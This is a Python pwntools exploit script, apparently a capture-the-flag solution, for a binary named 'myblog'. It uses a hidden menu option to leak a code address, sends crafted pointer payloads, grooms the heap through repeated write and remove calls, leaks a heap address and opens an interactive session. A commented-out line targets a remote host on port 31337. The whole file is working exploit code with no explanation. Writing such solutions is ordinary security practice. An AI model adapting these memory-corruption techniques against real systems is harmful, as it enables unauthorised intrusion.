from pwn import *

r = process(["./myblog"])
#r = remote("159.65.125.233", 31337)
def write(content,author):
	r.sendlineafter("4. Exit","1")
	r.sendlineafter("content",content)
	r.sendlineafter("author",author)

def remove(idx):
	r.sendlineafter("4. Exit","2")
	r.sendlineafter("index",str(idx))

def show(owner):
	r.sendlineafter("4. Exit","3")
	r.recvuntil(": ")
	val = u64(r.recvline()[:-1].ljust(8,'\x00'))
	r.sendafter("New Owner",owner)
	return val

r.sendlineafter("4. Exit","31337")
r.recvuntil("gift ")
text = int(r.recvline(),16)-0xef4
print hex(text)

r.send(p64(0x202080+text)*2+p64(text+0x10d8))
for i in range(0x7b):
	write("a","a")

r.sendlineafter("4. Exit","31337")
r.send(p64(0x20203f+text)*2+p64(text+0x10d8))
r.sendlineafter("4. Exit","31337")
r.send(p64(0x202080+text)*2+p64(text+0x10d8))
for i in range(0x7b):
	remove(i)
write("a","a")
heap = show("a")
print hex(heap)

r.interactive()
